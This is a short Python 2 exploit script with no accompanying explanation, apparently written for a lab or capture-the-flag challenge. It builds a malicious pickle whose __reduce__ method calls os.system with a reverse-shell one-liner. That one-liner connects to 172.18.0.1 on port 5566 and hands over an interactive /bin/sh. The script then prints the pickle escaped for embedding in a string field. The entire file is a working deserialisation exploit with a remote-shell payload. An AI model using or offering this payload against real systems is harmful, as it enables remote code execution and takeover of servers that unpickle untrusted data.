#!/usr/bin/python
import cPickle
import os

class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.18.0.1",5566));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        return (os.system, (s,))

e = exp()
s = cPickle.dumps(e)
print s.replace("\\", "\\\\").replace("\n",'\\\\n').replace("\"","\\\\\\\"")
